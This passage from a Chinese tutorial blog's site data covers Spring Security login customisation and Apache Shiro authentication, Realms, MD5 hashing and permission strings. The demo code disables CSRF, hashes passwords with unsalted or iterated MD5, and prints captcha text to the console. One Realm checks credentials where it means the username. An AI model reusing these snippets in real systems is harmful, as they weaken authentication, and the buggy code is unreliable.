imagecodefilter imagecodefilter = new imagecodefilter();\n    imagecodefilter.setcodeparameter("code");\n    imagecodefilter.setpasswordparameter("passwd");\n    imagecodefilter.setusernameparameter("uname");\n    imagecodefilter.setfilterprocessesurl("/dologin");\n    imagecodefilter.setauthenticationmanager(authenticationmanager());\n    return imagecodefilter;\n  }\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .mvcmatchers("/code").permitall()\n      .mvcmatchers("/login").permitall()\n      .mvcmatchers("/dologin").permitall()\n      .anyrequest().authenticated()\n      .and()\n      .formlogin()\n      .loginpage("/login")\n      .successforwardurl("/index")\n      .and()\n      .csrf().disable();\n    http.addfilterat(imagecodefilter(), usernamepasswordauthenticationfilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# 前后端分离案例\n\n 0. 创建前后端分离项目，引入相关依赖，测试环境。\n\n 1. 自定义数据源。和上面的并没有什么不同。\n\n 2. 自定义成功处理器和失败处理器以及无权限登录响应。\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n\n  private final userservice userservice;\n\n  @autowired\n  public securityconfig(userservice userservice) {\n    this.userservice = userservice;\n  }\n\n  @override\n  protected userdetailsservice userdetailsservice() {\n    return userservice;\n  }\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .anyrequest().authenticated()\n      .and()\n      .formlogin()\n      .successhandler(((request, response, authentication) -> {\n        response.setcontenttype("application/json;charset=utf-8");\n        hashmap<string, object> result = new hashmap<>();\n        result.put("msg","登录成功！");\n        result.put("code",200);\n        string resultjson = new objectmapper().writevalueasstring(result);\n        response.getwriter().write(resultjson);\n      }))\n      .failurehandler(((request, response, exception) -> {\n        response.setcontenttype("application/json;charset=utf-8");\n        hashmap<string, object> result = new hashmap<>();\n        result.put("msg","登录失败！");\n        result.put("code",401);\n        string resultjson = new objectmapper().writevalueasstring(result);\n        response.getwriter().write(resultjson);\n      }))\n      .and()\n      .exceptionhandling()\n      .authenticationentrypoint(((request, response, accessdeniedexception) -> {\n        response.setcontenttype("application/json;charset=utf-8");\n        hashmap<string, object> result = new hashmap<>();\n        result.put("msg","无权限访问！");\n        result.put("code",403);\n        string resultjson = new objectmapper().writevalueasstring(result);\n        response.getwriter().write(resultjson);\n\n      }))\n      .and().csrf().disable();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n 3. 自定义验证码处理，和上面一样。\n\n生成验证码并输出base64\n\n@getmapping("code")\npublic string code(httpsession session) throws ioexception {\n  string text = producer.createtext();\n  system.out.println(text);\n  session.setattribute(new imagecodefilter().getcodeparameter(),text);\n  bufferedimage image = producer.createimage(text);\n  bytearrayoutputstream bos = new bytearrayoutputstream();\n  imageio.write(image,"png",bos);\n  return base64.encodebase64string(bos.tobytearray());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n…………\n  @bean\n  public imagecodefilter imagecodefilter() throws exception {\n    imagecodefilter imagecodefilter = new imagecodefilter();\n    imagecodefilter.setcodeparameter("code");\n    imagecodefilter.setusernameparameter("uname");\n    imagecodefilter.setpasswordparameter("passwd");\n    imagecodefilter.setauthenticationmanager(authenticationmanager());\n    return imagecodefilter;\n  }\n\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .mvcmatchers("/code").permitall()\n\n      …………\n    http.addfilterat(imagecodefilter(), usernamepasswordauthenticationfilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 密码加密\n\n\n# rememberme\n\n\n# 会话管理\n\n\n# csrf',charsets:{cjk:!0},lastUpdated:"2022/04/25, 00:33:18",lastUpdatedTimestamp:1650846798e3},{title:"Shiro",frontmatter:{title:"Shiro",date:"2022-04-15T00:00:00.000Z",permalink:"/dev/java/eco/shiro",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务生态"],tags:["Springboot","Shiro"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1012.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%94%9F%E6%80%81/02.Shiro.html",relativePath:"01.开发/101.后端/1012.微服务生态/02.Shiro.md",key:"v-f9d6b4e4",path:"/dev/java/eco/shiro/",headers:[{level:2,title:"权限管理",slug:"权限管理",normalizedTitle:"权限管理",charIndex:119},{level:3,title:"权限管理的概念",slug:"权限管理的概念",normalizedTitle:"权限管理的概念",charIndex:128},{level:3,title:"身份认证的概念",slug:"身份认证的概念",normalizedTitle:"身份认证的概念",charIndex:302},{level:3,title:"授权的概念",slug:"授权的概念",normalizedTitle:"授权的概念",charIndex:444},{level:2,title:"Shiro的简介",slug:"shiro的简介",normalizedTitle:"shiro的简介",charIndex:518},{level:3,title:"Shiro的核心架构",slug:"shiro的核心架构",normalizedTitle:"shiro的核心架构",charIndex:1059},{level:2,title:"Shiro认证",slug:"shiro认证",normalizedTitle:"shiro认证",charIndex:2292},{level:3,title:"认证的相关对象",slug:"认证的相关对象",normalizedTitle:"认证的相关对象",charIndex:2401},{level:3,title:"认证的流程",slug:"认证的流程",normalizedTitle:"认证的流程",charIndex:2611},{level:3,title:"实现一个最简单的认证",slug:"实现一个最简单的认证",normalizedTitle:"实现一个最简单的认证",charIndex:2623},{level:3,title:"源码追踪shiro中的认证过程",slug:"源码追踪shiro中的认证过程",normalizedTitle:"源码追踪shiro中的认证过程",charIndex:5139},{level:3,title:"自定义的Realm",slug:"自定义的realm",normalizedTitle:"自定义的realm",charIndex:7908},{level:2,title:"Shiro授权",slug:"shiro授权",normalizedTitle:"shiro授权",charIndex:17398},{level:3,title:"Shiro 授权的关键对象",slug:"shiro-授权的关键对象",normalizedTitle:"shiro 授权的关键对象",charIndex:17476},{level:3,title:"授权的流程",slug:"授权的流程",normalizedTitle:"授权的流程",charIndex:17743},{level:3,title:"授权的方式",slug:"授权的方式",normalizedTitle:"授权的方式",charIndex:17755},{level:3,title:"权限字符串",slug:"权限字符串",normalizedTitle:"权限字符串",charIndex:18170},{level:3,title:"授权实现方式",slug:"授权实现方式",normalizedTitle:"授权实现方式",charIndex:18364},{level:3,title:"开发实现",slug:"开发实现",normalizedTitle:"开发实现",charIndex:18716},{level:2,title:"整合Springboot",slug:"整合springboot",normalizedTitle:"整合springboot",charIndex:22742},{level:3,title:"整合的思路",slug:"整合的思路",normalizedTitle:"整合的思路",charIndex:22759},{level:3,title:"整合的步骤",slug:"整合的步骤",normalizedTitle:"整合的步骤",charIndex:22771},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:55848}],excerpt:'<h1 id="shiro"><a class="header-anchor" href="#shiro">#</a> Shiro</h1>\n<p>Shiro 是一个功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速轻松地保护任何应用程序—从最小的移动应用程序到最大的web和企业应用程序。</p>\n',headersStr:"权限管理 权限管理的概念 身份认证的概念 授权的概念 Shiro的简介 Shiro的核心架构 Shiro认证 认证的相关对象 认证的流程 实现一个最简单的认证 源码追踪shiro中的认证过程 自定义的Realm Shiro授权 Shiro 授权的关键对象 授权的流程 授权的方式 权限字符串 授权实现方式 开发实现 整合Springboot 整合的思路 整合的步骤 参考资料",content:'# Shiro\n\nShiro 是一个功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速轻松地保护任何应用程序—从最小的移动应用程序到最大的web和企业应用程序。\n\n\n# 权限管理\n\n\n# 权限管理的概念\n\n基本上涉及到用户参与的系统都要进行权限管理，权限管理属于系统安全的范畴，权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源。\n\n权限管理包括用户身份认证和授权两部分，简称认证授权。对于需要访问控制的资源用户首先经过身份认证，认证通过后用户具有该资源的访问权限方可访问。\n\n\n# 身份认证的概念\n\n身份认证，就是判断一个用户是否为合法用户的处理过程。最常用的简单身份认证方式是系统通过核对用户输入的用户名和口令，看其是否与系统中存储的该用户的用户名和口令一致，来判断用户身份是否正确。对于采用指纹等系统，则出示指纹；对于硬件Key等刷卡系统，则需要刷卡。\n\n\n# 授权的概念\n\n授权，即访问控制，控制谁能访问哪些资源。主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的。\n\n\n# Shiro的简介\n\n> Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.\n> \n> Shiro 是一个功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速轻松地保护任何应用程序—从最小的移动应用程序到最大的web和企业应用程序。\n> \n> Shiro是apache旗下一个开源框架，它将软件系统的安全认证相关的功能抽取出来，实现用户身份认证，权限授权、加密、会话管理等功能，组成了一个通用的安全认证框架。\n\n\n# Shiro的核心架构\n\n\n\n# subject\n\nSubject即主体，外部应用与subject进行交互，subject记录了当前操作用户，将用户的概念理解为当前操作的主体，可能是一个通过浏览器请求的用户，也可能是一个运行的程序。Subject在shiro中是一个接口，接口中定义了很多认证授相关的方法，外部程序通过subject进行认证授，而subject是通过SecurityManager安全管理器进行认证授权。\n\n# securityManager\n\nSecurityManager即安全管理器，对全部的subject进行安全管理，它是shiro的核心，负责对所有的subject进行安全管理。通过SecurityManager可以完成subject的认证、授权等，实质上SecurityManager是通过Authenticator进行认证，通过Authorizer进行授权，通过SessionManager进行会话管理等。\n\nSecurityManager是一个接口，继承了Authenticator, Authorizer, SessionManager这三个接口。\n\n# Authenticator\n\nAuthenticator即认证器，对用户身份进行认证，Authenticator是一个接口，shiro提供ModularRealmAuthenticator实现类，通过ModularRealmAuthenticator基本上可以满足大多数需求，也可以自定义认证器。\n\n# Authorizer\n\nAuthorizer即授权器，用户通过认证器认证通过，在访问功能时需要通过授权器判断用户是否有此功能的操作权限。\n\n# Realm\n\nRealm即领域，相当于datasource数据源，securityManager进行安全认证需要通过Realm获取用户权限数据，比如：如果用户身份数据在数据库那么realm就需要从数据库获取用户身份信息。\n\n注意：不要把realm理解成只是从数据源取数据，在realm中还有认证授权校验的相关的代码。\n\n# SessionManager\n\nsessionManager即会话管理，shiro框架定义了一套会话管理，它不依赖web容器的session，所以shiro可以使用在非web应用上，也可以将分布式应用的会话集中在一点管理，此特性可使它实现单点登录。\n\n# SessionDAO\n\nSessionDAO即会话dao，是对session会话操作的一套接口，比如要将session存储到数据库，可以通过jdbc将会话存储到数据库。\n\n# CacheManager\n\nCacheManager即缓存管理，将用户权限数据存储在缓存，这样可以提高性能。\n\n# Cryptography\n\nCryptography即密码管理，shiro提供了一套加密/解密的组件，方便开发。比如提供常用的散列、加/解密等功能。\n\n\n# Shiro认证\n\n> 身份认证，就是判断一个用户是否为合法用户的处理过程。最常用的简单身份认证方式是系统通过核对用户输入的用户名和口令，看其是否与系统中存储的该用户的用户名和口令一致，来判断用户身份是否正确。\n\n\n# 认证的相关对象\n\n# subject 主体\n\n访问系统的用户，主体可以是用户、程序等，进行认证的都称为主体；\n\n# principal 身份信息\n\n主体（subject）进行身份认证的标识，标识必须具有唯一性，如用户名、手机号、邮箱地址等，一个主体可以有多个身份，但是必须有一个主身份（Primary Principal）。\n\n# credential 凭证信息\n\n只有主体自己知道的安全信息，如密码、证书等。\n\n\n# 认证的流程\n\n\n\n\n# 实现一个最简单的认证\n\n 1. 添加shiro的依赖，本次使用的shiro版本是：shiro1.5.3\n    \n    <dependencies>\n      <dependency>\n        <groupId>org.apache.shiro</groupId>\n        <artifactId>shiro-core</artifactId>\n        <version>1.5.3</version>\n      </dependency>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. 引入shiro配置文件，这个配置文件在后续的整合中用不到，只是为了学习使用的一个模拟的场景，以后的用户身份信息是要从数据库中取的。\n    \n    [users]\n    zhangsan=123456\n    lisi=123.bmk\n    \n    \n    1\n    2\n    3\n    \n\n 3. 测试认证的代码\n    \n    package com.pwddd.shirodemo;\n    \n    import org.apache.shiro.SecurityUtils;\n    import org.apache.shiro.authc.IncorrectCredentialsException;\n    import org.apache.shiro.authc.UnknownAccountException;\n    import org.apache.shiro.authc.UsernamePasswordToken;\n    import org.apache.shiro.mgt.DefaultSecurityManager;\n    import org.apache.shiro.realm.text.IniRealm;\n    import org.apache.shiro.subject.Subject;\n    \n    public class TestAuthenticator {\n        public static void main(String[] args) {\n    \n            // 1. 创建SecurityManager\n            DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n    \n            // 2. 创建默认的IniRealm 指定ini配置文件的位置\n            IniRealm iniRealm = new IniRealm("classpath:shiro.ini");\n    \n            // 3. 给securityManager设置一个realm\n            defaultSecurityManager.setRealm(iniRealm);\n    \n            // 4. 将安全工具类中设置一个安全管理器\n            SecurityUtils.setSecurityManager(defaultSecurityManager);\n    \n            // 5. 获取主体对象\n            Subject subject = SecurityUtils.getSubject();\n    \n            // 6. 模拟登陆信息创建令牌\n            UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n    \n            try {\n    \n                // 7. 尝试使用令牌登陆\n                subject.login(token);\n                System.out.println("认证成功"+subject.isAuthenticated());\n            }catch (UnknownAccountException e){\n                System.out.println("用户名不存在");\n            }catch (IncorrectCredentialsException e){\n                System.out.println("认证未通过");\n            }\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\n对应的异常分类：\n\n * DisabledAccountException（帐号被禁用）\n\n * LockedAccountException（帐号被锁定）\n\n * ExcessiveAttemptsException（登录失败次数过多）\n\n * ExpiredCredentialsException（凭证过期）等\n\n\n# 源码追踪shiro中的认证过程\n\n用户名验证的调用：\n\ndoGetAuthenticationInfo:162, SimpleAccountRealm (org.apache.shiro.realm)\ngetAuthenticationInfo:571, AuthenticatingRealm (org.apache.shiro.realm)\ndoSingleRealmAuthentication:180, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\ndoAuthenticate:273, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, AbstractAuthenticator (org.apache.shiro.authc)\nauthenticate:106, AuthenticatingSecurityManager (org.apache.shiro.mgt)\nlogin:275, DefaultSecurityManager (org.apache.shiro.mgt)\nlogin:260, DelegatingSubject (org.apache.shiro.subject.support)\nmain:35, TestAuthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n最终在org.apache.shiro.realm.SimpleAccountRealm#doGetAuthenticationInfo根据token中的用户名在在对应的配置文件中查找对应的用户，此处还没有做密码的校验。\n\n\n\n密码校验的调用：\n\ndoCredentialsMatch:127, SimpleCredentialsMatcher (org.apache.shiro.authc.credential)\nassertCredentialsMatch:600, AuthenticatingRealm (org.apache.shiro.realm)\ngetAuthenticationInfo:581, AuthenticatingRealm (org.apache.shiro.realm)\ndoSingleRealmAuthentication:180, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\ndoAuthenticate:273, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, AbstractAuthenticator (org.apache.shiro.authc)\nauthenticate:106, AuthenticatingSecurityManager (org.apache.shiro.mgt)\nlogin:275, DefaultSecurityManager (org.apache.shiro.mgt)\nlogin:260, DelegatingSubject (org.apache.shiro.subject.support)\nmain:35, TestAuthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n最终在org.apache.shiro.authc.credential.SimpleCredentialsMatcher#doCredentialsMatch中验证密码是否匹配。\n\n\n\nshiro中的Realm的类结构如下：\n\n\n\n根据源码发现，认证使用的是SimpleAccountRealm\n\n\n\n在SimpleAccountRealm有两个方法，一个是用来认证的，另一个是用来授权的。\n\npublic class SimpleAccountRealm extends AuthorizingRealm {\n  //.......省略\n  protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {\n    UsernamePasswordToken upToken = (UsernamePasswordToken) token;\n    SimpleAccount account = getUser(upToken.getUsername());\n\n    if (account != null) {\n\n      if (account.isLocked()) {\n        throw new LockedAccountException("Account [" + account + "] is locked.");\n      }\n      if (account.isCredentialsExpired()) {\n        String msg = "The credentials for account [" + account + "] are expired";\n        throw new ExpiredCredentialsException(msg);\n      }\n\n    }\n\n    return account;\n  }\n\n  protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {\n    String username = getUsername(principals);\n    USERS_LOCK.readLock().lock();\n    try {\n      return this.users.get(username);\n    } finally {\n      USERS_LOCK.readLock().unlock();\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 自定义的Realm\n\n在上面的程序中，我们使用的shiro自带的IniRealm，并且用户名密码是储存到ini配置文件中的，在大部分的情况下，我们需要从系统的数据库中读取相关的用户信息，因此需要自定义Realm。\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthenticatingRealm;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\n\npublic class CustomerRealm extends AuthorizingRealm {\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        return null;\n    }\n\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        String principal = (String) authenticationToken.getPrincipal();\n        if ("zhangsan".equals(principal)){\n          \n          \t// 这里模拟从数据库中查询获取到的用户名和密码\n            SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo("zhangsan", "123", this.getName());\n            return authenticationInfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n自定义Realm的测试方法：\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.CustomerRealm;\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.mgt.DefaultSecurityManager;\nimport org.apache.shiro.subject.Subject;\n\npublic class TestCustomerRealm {\n    public static void main(String[] args) {\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n        defaultSecurityManager.setRealm(new CustomerRealm());\n\n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n\n        Subject subject = SecurityUtils.getSubject();\n\n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123");\n\n\n        try {\n            subject.login(token);\n        } catch (AuthenticationException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n# 使用MD5加密和盐\n\n> 在上面的测试中，我们一直使用的是明文密码的方式，这种方式有很大的安全隐患，和我们使用安全框架的初衷相背离。在实际的场景中，一般是在注册阶段，将用户设置的密码加盐然后散列存储到数据库中，然后使用shiro从数据库中读取出盐和秘文，完成密码校验。\n\n# MD5测试\n\npackage com.pwddd.shirodemo;\n\nimport org.apache.shiro.crypto.hash.Md5Hash;\n\npublic class TestMD5 {\n  public static void main(String[] args) {\n\n    Md5Hash hash = new Md5Hash();\n    hash.setBytes("123456".getBytes());\n    System.out.println(hash.toHex()); // 313233343536\n\n\n    // md5加密\n    Md5Hash md5Hash = new Md5Hash("123456");\n    System.out.println(md5Hash.toHex()); // e10adc3949ba59abbe56e057f20f883e\n    // 加盐\n    Md5Hash md5HashWithSalt = new Md5Hash("123456","123/BMK#");\n    System.out.println(md5HashWithSalt.toHex()); //a43ebab3045680d4b3d6c5ccac659d10\n\n    //散列\n    Md5Hash hashInter = new Md5Hash("123456", "123/BMK#", 1024);\n    System.out.println(hashInter.toHex()); //a991e133559f1891893b60a3c04e8740\n\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# 自定义Realm实现MD5\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthenticatingRealm;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\n\npublic class CustomerRealm extends AuthorizingRealm {\n  @Override\n  protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n    return null;\n  }\n\n  @Override\n  protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n    String credentials = (String) authenticationToken.getCredentials();\n    if ("zhangsan".equals(credentials)){\n      \n      // 模拟查出来的密码是加密后的密码，其他不变\n      SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n        "zhangsan",\n        "e10adc3949ba59abbe56e057f20f883e",\n        this.getName());\n\n      return authenticationInfo;\n    }\n    return null;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n测试方法：\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.CustomerRealm;\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.authc.credential.HashedCredentialsMatcher;\nimport org.apache.shiro.mgt.DefaultSecurityManager;\nimport org.apache.shiro.subject.Subject;\n\npublic class TestMD5Realm {\n    public static void main(String[] args) {\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n\n        CustomerRealm customerRealm = new CustomerRealm();\n\n        // 设置md5加密\n        HashedCredentialsMatcher hashedCredentialsMatcher = new HashedCredentialsMatcher();\n        hashedCredentialsMatcher.setHashAlgorithmName("MD5");\n\n        customerRealm.setCredentialsMatcher(hashedCredentialsMatcher);\n\n        defaultSecurityManager.setRealm(customerRealm);\n\n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n\n        Subject subject = SecurityUtils.getSubject();\n\n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            System.out.println("登陆成功");\n        } catch (AuthenticationException e) {\n            e.printStackTrace();\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n# 自定义Realm实现MD5加salt方式\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthenticatingRealm;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\nimport org.apache.shiro.util.ByteSource;\n\npublic class CustomerRealm extends AuthorizingRealm {\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        return null;\n    }\n\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        String principal = (String) authenticationToken.getPrincipal();\n\n        if ("zhangsan".equals(principal)){\n            SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n                    "zhangsan",\n                    "a43ebab3045680d4b3d6c5ccac659d10",\n                    // 由于盐也是从数据库中查出来的，因此在这里一起配置了\n                    ByteSource.Util.bytes("123/BMK#"),\n                    this.getName());\n\n            return authenticationInfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n测试方法和上面的一样。\n\n# 自定义Realm 实现 自定义MD5+salt+散列\n\n 1. 如果使用了散列hash，则从数据库中查出来的是散列之后的，因此realm不需要变\n\n 2. 测试方法中需要指定散列的次数，因为用户输入明文密码时，shrio不知道散列的次数，因此对比会失败。\n    \n    package com.pwddd.shirodemo;\n    \n    import com.pwddd.shirodemo.realm.CustomerRealm;\n    import org.apache.shiro.SecurityUtils;\n    import org.apache.shiro.authc.AuthenticationException;\n    import org.apache.shiro.authc.IncorrectCredentialsException;\n    import org.apache.shiro.authc.UsernamePasswordToken;\n    import org.apache.shiro.authc.credential.HashedCredentialsMatcher;\n    import org.apache.shiro.mgt.DefaultSecurityManager;\n    import org.apache.shiro.subject.Subject;\n    \n    public class TestMD5Realm {\n      public static void main(String[] args) {\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n    \n        CustomerRealm customerRealm = new CustomerRealm();\n    \n        // 设置md5加密\n        HashedCredentialsMatcher hashedCredentialsMatcher = new HashedCredentialsMatcher();\n        hashedCredentialsMatcher.setHashAlgorithmName("MD5");\n        // 设置散列次数\n        hashedCredentialsMatcher.setHashIterations(1024);\n    \n        customerRealm.setCredentialsMatcher(hashedCredentialsMatcher);\n    \n        defaultSecurityManager.setRealm(customerRealm);\n    \n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n    \n        Subject subject = SecurityUtils.getSubject();\n    \n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n    \n        try {\n          subject.login(token);\n          System.out.println("登陆成功");\n        } catch (IncorrectCredentialsException e) {\n          e.printStackTrace();\n          System.out.println("密码错误");\n        }\n      }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# Shiro授权\n\n> 授权，即访问控制，控制谁能访问哪些资源。主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的。\n\n\n# Shiro 授权的关键对象\n\nWho，即主体（Subject），主体需要访问系统中的资源。\n\nWhat，即资源（Resource)，如系统菜单、页面、按钮、类方法、系统商品信息等。资源包括资源类型和资源实例，比如商品信息为资源类型，类型为t01的商品为资源实例，编号为001的商品信息也属于资源实例。\n\nHow，权限/许可（Permission)，规定了主体对资源的操作许可，权限离开资源没有意义，如用户查询权限、用户添加权限、某个类方法的调用权限、编号为001用户的修改权限等，通过权限可知主体对哪些资源都有哪些操作许可。\n\n\n# 授权的流程\n\n\n\n\n# 授权的方式\n\n * 基于角色的访问控制\n\n * RBAC基于角色的访问控制（Role-Based Access Control）是以角色为中心进行访问控制\n\nif(subject.hasRole("admin")){\n   //操作什么资源\n}\n\n\n1\n2\n3\n\n\n * 基于资源的访问控制\n   \n   * RBAC基于资源的访问控制（Resource-Based Access Control）是以资源为中心进行访问控制\n   \n   if(subject.isPermission("user:update:01")){ //资源实例\n     //对01用户进行修改\n   }\n   if(subject.isPermission("user:update:*")){  //资源类型\n     //对01用户进行修改\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n\n# 权限字符串\n\n权限字符串的规则是：资源标识符：操作：资源实例标识符，意思是 对哪个资源的哪个实例具有什么操作，“:”是资源/操作/实例的分割符，权限字符串也可以使用*通配符。\n\n例子：\n\n * 用户创建权限：user:create，或user:create:*\n * 用户修改实例001的权限：user:update:001\n * 